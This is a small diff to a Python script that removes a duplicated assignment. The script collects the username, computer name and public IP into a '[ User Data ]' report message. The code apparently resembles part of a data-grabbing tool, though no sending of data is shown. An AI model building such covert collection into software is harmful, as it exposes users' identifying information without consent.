@@ -67,7 +67,7 @@ try:
 except Exception as e:
     ip = "Unable to fetch"
 
-pc_name = pc_name = os.getenv('COMPUTERNAME') if os.getenv('COMPUTERNAME') is not None else os.uname().nodename
+pc_name = os.getenv('COMPUTERNAME') if os.getenv('COMPUTERNAME') is not None else os.uname().nodename
 user = os.getenv('username')
 
 message += f"[ User Data ]\\n - Username: {user}\\n - Computer name: {pc_name}\\n - IP: {ip}\\n\\n"
